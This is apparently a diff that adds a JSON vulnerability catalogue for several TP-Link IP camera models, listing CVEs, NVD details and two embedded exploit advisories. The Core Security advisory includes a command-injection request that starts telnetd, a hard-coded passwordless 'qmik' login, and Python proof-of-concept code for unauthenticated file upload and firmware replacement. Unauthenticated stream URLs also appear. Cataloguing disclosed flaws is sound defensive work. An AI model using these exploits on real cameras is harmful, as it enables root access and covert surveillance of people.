@@ -1,0 +1,495 @@
+{
+    "ves": {
+        "ves:product": {
+            "product": "TP-link camera",
+            "manufacturer": "TP-link",
+            "models": {
+                "tp-link_tl-sc3130": {
+                    "vulnerability": [
+                        "CVE-2018-18428",
+                        "CVE-2013-2581",
+                        "CVE-2013-2580",
+                        "CVE-2013-2579",
+                        "CVE-2013-2578",
+                        "CVE-2013-3688"
+                    ],
+                    "exploit": [
+                        "45632",
+                        "27289"
+                    ]
+                },
+                "tp-link_tl-sc3130g": {
+                    "vulnerability": [
+                        "CVE-2013-2581",
+                        "CVE-2013-2580",
+                        "CVE-2013-2579",
+                        "CVE-2013-2578",
+                        "CVE-2013-3688"
+                    ],
+                    "exploit": [
+                        "27289"
+                    ]
+                },
+                "tp-link_tl-sc3171": {
+                    "vulnerability": [
+                        "CVE-2013-2581",
+                        "CVE-2013-2580",
+                        "CVE-2013-2579",
+                        "CVE-2013-2578",
+                        "CVE-2013-3688"
+                    ],
+                    "exploit": [
+                        "27289"
+                    ]
+                },
+                "tp-link_tl-sc3171g": {
+                    "vulnerability": [
+                        "CVE-2013-2581",
+                        "CVE-2013-2580",
+                        "CVE-2013-2579",
+                        "CVE-2013-2578",
+                        "CVE-2013-3688"
+                    ],
+                    "exploit": [
+                        "27289"
+                    ]
+                },
+                "tp-link_lm": {
+                    "vulnerability": [
+                        "CVE-2013-2581",
+                        "CVE-2013-2580",
+                        "CVE-2013-2579",
+                        "CVE-2013-2578",
+                        "CVE-2013-3688"
+                    ],
+                    "exploit": [
+                        "27289"
+                    ]
+                }
+            }
+        },
+        "ves:vulnerability": {
+            "CVE-2018-18428": {
+                "basic-info": {
+                    "description": [
+                        "TP-Link TL-SC3130 1.6.18P12_121101 devices allow unauthenticated RTSP stream access, as demonstrated by a /jpg/image.jpg URI."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "19-Oct-2018",
+                        "nvd-last-modified": "23-Jan-2019"
+                    },
+                    "impact-score": " 3.6 ",
+                    "exploitability-score": " 3.9 ",
+                    "cwe-id": "CWE-200",
+                    "cwe": "Exposure of Sensitive Information to an Unauthorized Actor",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/200.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2018-18428",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-sc3130_firmware:1.6.18p12_121101:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "None",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "None",
+                        "availability": "None"
+                    }
+                }
+            },
+            "CVE-2013-2581": {
+                "basic-info": {
+                    "description": [
+                        "cgi-bin/firmwareupgrade in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 allows remote attackers to modify the firmware revision via a \"preset\" action."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "11-Oct-2013",
+                        "nvd-last-modified": "15-Oct-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-264",
+                    "cwe": "Permissions, Privileges, and Access Controls",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/264.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-2581",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-5": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:lm_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 1.6.18p12_sign5 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2013-2580": {
+                "basic-info": {
+                    "description": [
+                        "Unrestricted file upload vulnerability in cgi-bin/uploadfile in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6, allows remote attackers to upload arbitrary files, then accessing it via a direct request to the file in the mnt/mtd directory."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "11-Oct-2013",
+                        "nvd-last-modified": "15-Oct-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "NA",
+                    "cwe": "Other",
+                    "cwe-link": [],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-2580",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-5": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:lm_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 1.6.18p12_sign5 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2013-2579": {
+                "basic-info": {
+                    "description": [
+                        "TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 have an empty password for the hardcoded \"qmik\" account, which allows remote attackers to obtain administrative access via a TELNET session."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "11-Oct-2013",
+                        "nvd-last-modified": "15-Oct-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-255",
+                    "cwe": "Credentials Management Errors",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/255.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-2579",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-5": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:lm_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 1.6.18p12_sign5 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2013-2578": {
+                "basic-info": {
+                    "description": [
+                        "cgi-bin/admin/servetest in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 allows remote attackers to execute arbitrary commands via shell metacharacters in (1) the ServerName parameter and (2) other unspecified parameters."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "11-Oct-2013",
+                        "nvd-last-modified": "15-Oct-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-78",
+                    "cwe": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/78.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-2578",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-5": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:lm_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 1.6.18p12_sign5 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2013-3688": {
+                "basic-info": {
+                    "description": [
+                        "The TP-Link IP Cameras TL-SC3171, TL-SC3130, TL-SC3130G, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6, does not properly restrict access to certain administrative functions, which allows remote attackers to (1) cause a denial of service (device reboot) via a request to cgi-bin/reboot or (2) cause a denial of service (reboot and reset to factory defaults) via a request to cgi-bin/hardfactorydefault."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "01-Oct-2013",
+                        "nvd-last-modified": "04-Oct-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-264",
+                    "cwe": "Permissions, Privileges, and Access Controls",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/264.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-3688",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3130g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-sc3171g:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-5": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:lm_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 1.6.18p12_sign5 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            }
+        },
+        "ves:exploit": {
+            "45632": {
+                "exploit-title": "TP-Link TL-SC3130 1.6.18 - RTSP Stream Disclosure",
+                "platform": "Hardware",
+                "exploit-timestamps": {
+                    "created": "NA",
+                    "edb-published": "17-Oct-2018"
+                },
+                "cve": [
+                    "CVE-2018-18428"
+                ],
+                "content": [
+                    "\"# Exploit Title: TP-Link TL-SC3130 1.6.18 - RTSP Stream Disclosure\\\\r\\\n# Author: Gjoko \\'LiquidWorm\\' Krstic @zeroscience\\\\r\\\n# Date: 2018-10-17\\\\r\\\n# Vendor: TP-LINK Technologies Co., Ltd.\\\\r\\\n# Product web page: http://www.tp-link.com\\\\r\\\n# Affected version: 1.6.18P12_121101\\\\r\\\n# Tested on: Boa/0.94.14rc21\\\\r\\\n# CVE: N/A\\\\r\\\n# References:\\\\r\\\n# Advisory ID: ZSL-2018-5497\\\\r\\\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5497.php\\\\r\\\n\\\\r\\\nDesc: The TP-Link TL-SC3130 suffers from an unauthenticated and unauthorized\\\\r\\\nlive RTSP stream disclosure.\\\\r\\\n\\\\r\\\n# PoC:\\\\r\\\n\\\\r\\\nhttp://TARGET/jpg/image.jpg\\\\r\\\nrtsp://TARGET:554/video.3gp\""
+                ]
+            },
+            "27289": {
+                "exploit-title": "TP-Link TL-SC3171 IP Cameras - Multiple Vulnerabilities",
+                "platform": "Hardware",
+                "exploit-timestamps": {
+                    "created": "NA",
+                    "edb-published": "02-Aug-2013"
+                },
+                "cve": [
+                    "CVE-2013-2581"
+                ],
+                "content": [
+                    "\\'Core Security - Corelabs Advisory\\\\r\\\nhttp://corelabs.coresecurity.com/\\\\r\\\n\\\\r\\\nMultiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras\\\\r\\\n\\\\r\\\n\\\\r\\\n1. *Advisory Information*\\\\r\\\n\\\\r\\\nTitle: Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras\\\\r\\\nAdvisory ID: CORE-2013-0618\\\\r\\\nAdvisory URL:\\\\r\\\nhttp://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras\\\\r\\\nDate published: 2013-07-30\\\\r\\\nDate of last update: 2013-07-30\\\\r\\\nVendors contacted: TP-Link\\\\r\\\nRelease mode: Coordinated release\\\\r\\\n\\\\r\\\n\\\\r\\\n2. *Vulnerability Information*\\\\r\\\n\\\\r\\\nClass: OS command injection [CWE-78], Use of hard-coded credentials\\\\r\\\n[CWE-798], Authentication Bypass Issues [CWE-592], Missing\\\\r\\\nAuthentication for Critical Function [CWE-306]\\\\r\\\nImpact: Code execution, Security bypass\\\\r\\\nRemotely Exploitable: Yes\\\\r\\\nLocally Exploitable: No\\\\r\\\nCVE Name: CVE-2013-2578, CVE-2013-2579, CVE-2013-2580, CVE-2013-2581\\\\r\\\n\\\\r\\\n\\\\r\\\n3. *Vulnerability Description*\\\\r\\\n\\\\r\\\nMultiple vulnerabilities have been found in TP-Link TL-SC3171 [1] IP\\\\r\\\ncamera running firmware version LM.1.6.18P12_sign5 that could allow an\\\\r\\\nattacker:\\\\r\\\n\\\\r\\\n   1. [CVE-2013-2578] to execute arbitrary commands through the file\\\\r\\\n\\\\\\'/cgi-bin/admin/servetest\\\\\\'.\\\\r\\\n   2. [CVE-2013-2579] to execute arbitrary commands in a shell using\\\\r\\\nhard-coded credentials.\\\\r\\\n   3. [CVE-2013-2580] to perform unauthenticated remote file uploads.\\\\r\\\n   5. [CVE-2013-2581] to perform unauthenticated remote firmware upgrades.\\\\r\\\n\\\\r\\\n3.1. *Attack Paths*\\\\r\\\n\\\\r\\\nThere are several attack paths that can be exploited by combining these\\\\r\\\nvulnerabilities with other ones discovered by Eliezer Varade Lopez,\\\\r\\\nJavier Repiso Sanchez and Jonas Ropero Castillo [2]. Additional attack\\\\r\\\npaths are available, but the ones listed here allow understanding how an\\\\r\\\nattacker could compromise the affected device.\\\\r\\\n\\\\r\\\n3.1.1. *Attack Path I*\\\\r\\\n\\\\r\\\n(Authentication: none)\\\\r\\\n\\\\r\\\n   1. Upload a rooted firmware exploiting [CVE-2013-2581].\\\\r\\\n   2. Reboot the device by exploiting \\\\\\'http://<ip-cam>/cgi-bin/reboot\\\\\\'[2].\\\\r\\\n\\\\r\\\n3.1.2. *Attack Path II*\\\\r\\\n\\\\r\\\n(Authentication: bypassed)\\\\r\\\n\\\\r\\\n   1. Reset the device to its factory defaults exploiting\\\\r\\\n\\\\\\'http://<ip-cam>/cgi-bin/hardfactorydefault\\\\\\'[2]. After this step, the\\\\r\\\nauthentication can by bypassed by using \\\\\\'admin:admin\\\\\\' as a valid\\\\r\\\n\\\\\\'username:password\\\\\\'.\\\\r\\\n   2. Reboot the device by exploiting \\\\\\'http://<ip-cam>/cgi-bin/reboot\\\\\\'[2].\\\\r\\\n   3. Start the Telnet service exploiting [CVE-2013-2578].\\\\r\\\n   4. Login to the Telnet service using user \\\\\\'qmik\\\\\\' (no password)\\\\r\\\n[CVE-2013-2579], and use the device as a pivoting point.\\\\r\\\n\\\\r\\\n4. *Vulnerable Packages*\\\\r\\\n\\\\r\\\nTests and PoC were run on:\\\\r\\\n\\\\r\\\n   . TP-Link TL-SC3171 IP camera running firmware version\\\\r\\\nLM.1.6.18P12_sign5.\\\\r\\\n   . Other TP-Link cameras and firmware versions are probably affected\\\\r\\\ntoo, but they were not checked.\\\\r\\\n\\\\r\\\n5. *Vendor Information, Solutions and Workarounds*\\\\r\\\n\\\\r\\\nVendor provides the links to (pre-release) patched firmware versions\\\\r\\\n[3]. The final official versions will be released in the next few days.\\\\r\\\nPlease, contact TP-Link for further information.\\\\r\\\n\\\\r\\\n6. *Credits*\\\\r\\\n\\\\r\\\nThese vulnerabilities were discovered by Flavio de Cristofaro and\\\\r\\\nresearched with the help of Andres Blanco from Core Security\\\\r\\\nTechnologies. The publication of this advisory was coordinated by\\\\r\\\nFernando Miranda from Core Advisories Team.\\\\r\\\n\\\\r\\\n\\\\r\\\n7. *Technical Description / Proof of Concept Code*\\\\r\\\n\\\\r\\\n7.1. *OS Command Injection in servetest*\\\\r\\\n\\\\r\\\n[CVE-2013-2578] The file \\\\\\'/cgi-bin/admin/servetest\\\\\\' has an OS command\\\\r\\\ninjection in several of its parameters that can be exploited by an\\\\r\\\nauthenticated user to execute arbitrary commands. The following proof of\\\\r\\\nconcept starts the telnetd service:\\\\r\\\n\\\\r\\\n/-----\\\\r\\\nGET\\\\r\\\n/cgi-bin/admin/servetest?cmd=smtp&ServerName=1.1.1.1;/usr/sbin/telnetd;&ServerPort=25&ServerSSL=off&RcptToAddr1=q@q&AdminAddr=q@q\\\\r\\\nHTTP/1.1\\\\r\\\nAccept: */*\\\\r\\\nAccept-Language: en-us\\\\r\\\nReferer: http://192.168.1.100/progress.htm\\\\r\\\nIf-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\\\\r\\\nAccept-Encoding: gzip, deflate\\\\r\\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;\\\\r\\\nTrident/5.0)\\\\r\\\nHost: 192.168.1.100\\\\r\\\nProxy-Connection: Keep-Alive\\\\r\\\nCookie: VideoFmt=1\\\\r\\\nAuthorization: Basic YWRtaW46YWRtaW4=\\\\r\\\nContent-Length: 2\\\\r\\\n-----/\\\\r\\\n\\\\r\\\n7.2. *Hard-coded credentials in telnet service*\\\\r\\\n\\\\r\\\n[CVE-2013-2579] The affected system includes a hard-coded login with no\\\\r\\\npassword which could be used by a remote attacker to access the OS of\\\\r\\\nthe affected device using the built-in telnet service:\\\\r\\\n\\\\r\\\n/-----\\\\r\\\nusername: qmik\\\\r\\\npassword: (none)      \\\\r\\\n-----/\\\\r\\\n\\\\r\\\nThe \\\\\\'qmik\\\\\\' user is allowed to execute the command \\\\\\'su\\\\\\', allowing the\\\\r\\\nuser to execute arbitrary commands with root level privileges. The\\\\r\\\ntelnet service can be enabled through [CVE-2013-2578].\\\\r\\\n\\\\r\\\n\\\\r\\\n7.3. *Unauthenticated remote file uploads*\\\\r\\\n\\\\r\\\n[CVE-2013-2580] The file \\\\\\'/cgi-bin/uploadfile\\\\\\' allows an unauthenticated\\\\r\\\nuser to perform remote file uploads as shown in the following Python PoC:\\\\r\\\n\\\\r\\\n\\\\r\\\n/-----\\\\r\\\nimport requests\\\\r\\\n\\\\r\\\nfileName = \"lala.tmp\"\\\\r\\\nf = open(fileName, \"w\")\\\\r\\\nf.write(\"lala\")\\\\r\\\nf.close()\\\\r\\\nrequests.post(\"http://192.168.1.100/cgi-bin/uploadfile\",\\\\r\\\nfiles={fileName: open(fileName, \"rb\")})\\\\r\\\n-----/\\\\r\\\n\\\\r\\\nThe uploaded file (in this example lala.tmp) will be hosted in the\\\\r\\\n\\\\\\'/mnt/mtd\\\\\\' directory.\\\\r\\\n\\\\r\\\n\\\\r\\\n7.4. *Unauthenticated remote firmware upgrades*\\\\r\\\n\\\\r\\\n[CVE-2013-2581] The file \\\\\\'/cgi-bin/firmwareupgrade\\\\\\' allows an\\\\r\\\nunauthenticated user to perform remote firmware upgrades as shown in the\\\\r\\\nfollowing Python POC:\\\\r\\\n\\\\r\\\n\\\\r\\\n/-----\\\\r\\\nimport requests\\\\r\\\n\\\\r\\\nrequests.get(\"http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset\")\\\\r\\\nfileName = \"COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin\"\\\\r\\\ncookies={\"VideoFmt\":\"1\"}\\\\r\\\nrequests.post(\"http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset\",\\\\r\\\nfiles={\"SetFWFileName\" : (fileName, open(fileName, \"rb\"))}, cookies=cookies)\\\\r\\\n-----/\\\\r\\\n\\\\r\\\n\\\\r\\\n8. *Report Timeline*\\\\r\\\n\\\\r\\\n. 2013-06-12:\\\\r\\\nCore Security Technologies notifies the TP-Link team of the vulnerability.\\\\r\\\n\\\\r\\\n. 2013-06-18:\\\\r\\\nCore Security Technologies notifies the TP-Link team of the\\\\r\\\nvulnerability and set the estimated publication date of the advisory for\\\\r\\\nJuly 10, 2013.\\\\r\\\n\\\\r\\\n. 2013-06-19:\\\\r\\\nTP-Link answers saying that these vulnerabilities are the same as the\\\\r\\\nones published on May 28, 2013.\\\\r\\\n\\\\r\\\n. 2013-06-26:\\\\r\\\nCore Security Technologies notifies the TP-Link team that these are new,\\\\r\\\ndifferent, vulnerabilities and sends a draft report with technical\\\\r\\\ninformation.\\\\r\\\n\\\\r\\\n. 2013-06-26:\\\\r\\\nVendor acknowledges the receipt of the technical report.\\\\r\\\n\\\\r\\\n. 2013-07-01:\\\\r\\\nVendor requests additional technical information.\\\\r\\\n\\\\r\\\n. 2013-07-04:\\\\r\\\nCore re-sends an improved technical report with additional information\\\\r\\\nregarding possible attack paths [Sec. 3.1].\\\\r\\\n\\\\r\\\n. 2013-07-10:\\\\r\\\nFirst release date missed.\\\\r\\\n\\\\r\\\n. 2013-07-15:\\\\r\\\nCore asks for a status update.\\\\r\\\n\\\\r\\\n. 2013-07-22:\\\\r\\\nVendor notifies that a patched firmware version will be released on July\\\\r\\\n29th.\\\\r\\\n\\\\r\\\n. 2013-07-22:\\\\r\\\nCore re-schedules the advisory publication for July 29th.\\\\r\\\n\\\\r\\\n. 2013-07-26:\\\\r\\\nVendor notifies that a (pre-release) patched firmware version is\\\\r\\\navailable [3] and being tested. The final firmware version will be\\\\r\\\nreleased in the next few days.\\\\r\\\n\\\\r\\\n. 2013-07-30:\\\\r\\\nAdvisory CORE-2013-0618 is published.\\\\r\\\n\\\\r\\\n\\\\r\\\n9. *References*\\\\r\\\n\\\\r\\\n[1] TP-Link TL-SC3171,\\\\r\\\nhttp://www.tp-link.com/en/products/details/?categoryid=230&model=TL-SC3171.\\\\r\\\n[2] Security Analysis of IP video surveillance cameras,\\\\r\\\nhttp://seclists.org/fulldisclosure/2013/Jun/84.\\\\r\\\n[3] See the online version,\\\\r\\\nhttp://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras.\\\\r\\\n\\\\r\\\n\\\\r\\\n10. *About CoreLabs*\\\\r\\\n\\\\r\\\nCoreLabs, the research center of Core Security Technologies, is charged\\\\r\\\nwith anticipating the future needs and requirements for information\\\\r\\\nsecurity technologies. We conduct our research in several important\\\\r\\\nareas of computer security including system vulnerabilities, cyber\\\\r\\\nattack planning and simulation, source code auditing, and cryptography.\\\\r\\\nOur results include problem formalization, identification of\\\\r\\\nvulnerabilities, novel solutions and prototypes for new technologies.\\\\r\\\nCoreLabs regularly publishes security advisories, technical papers,\\\\r\\\nproject information and shared software tools for public use at:\\\\r\\\nhttp://corelabs.coresecurity.com.\\\\r\\\n\\\\r\\\n\\\\r\\\n11. *About Core Security Technologies*\\\\r\\\n\\\\r\\\nCore Security Technologies enables organizations to get ahead of threats\\\\r\\\nwith security test and measurement solutions that continuously identify\\\\r\\\nand demonstrate real-world exposures to their most critical assets. Our\\\\r\\\ncustomers can gain real visibility into their security standing, real\\\\r\\\nvalidation of their security controls, and real metrics to more\\\\r\\\neffectively secure their organizations.\\\\r\\\n\\\\r\\\nCore Security\\\\\\'s software solutions build on over a decade of trusted\\\\r\\\nresearch and leading-edge threat expertise from the company\\\\\\'s Security\\\\r\\\nConsulting Services, CoreLabs and Engineering groups. Core Security\\\\r\\\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\\\\r\\\nhttp://www.coresecurity.com.\\\\r\\\n\\\\r\\\n\\\\r\\\n12. *Disclaimer*\\\\r\\\n\\\\r\\\nThe contents of this advisory are copyright (c) 2013 Core Security\\\\r\\\nTechnologies and (c) 2013 CoreLabs, and are licensed under a Creative\\\\r\\\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\\\\r\\\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\\\\r\\\n\\\\r\\\n\\\\r\\\n13. *PGP/GPG Keys*\\\\r\\\n\\\\r\\\nThis advisory has been signed with the GPG key of Core Security\\\\r\\\nTechnologies advisories team, which is available for download at\\\\r\\\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\\"
+                ]
+            }
+        },
+        "ves:solution": {
+            "CVE-2018-18428": {
+                "solution-1": {
+                    "url": "https://packetstormsecurity.com/files/149843",
+                    "type": "Exploit, Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "17-Oct-2018",
+                        "last-updated": "NA",
+                        "nvd-indexed": "23-Jan-2019",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "https://www.exploit-db.com/exploits/45632/",
+                    "type": "Exploit, Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "23-Jan-2019",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-3": {
+                    "url": "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5497.php",
+                    "type": "Exploit, Third Party Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "17-Oct-2018",
+                        "last-updated": "NA",
+                        "nvd-indexed": "23-Jan-2019",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-2581": {
+                "solution-1": {
+                    "url": "http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "15-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-2580": {
+                "solution-1": {
+                    "url": "http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "15-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-2579": {
+                "solution-1": {
+                    "url": "http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "15-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-2578": {
+                "solution-1": {
+                    "url": "http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "15-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-3688": {
+                "solution-1": {
+                    "url": "http://seclists.org/fulldisclosure/2013/Jun/84",
+                    "type": "NA",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "12-Jun-2013",
+                        "last-updated": "NA",
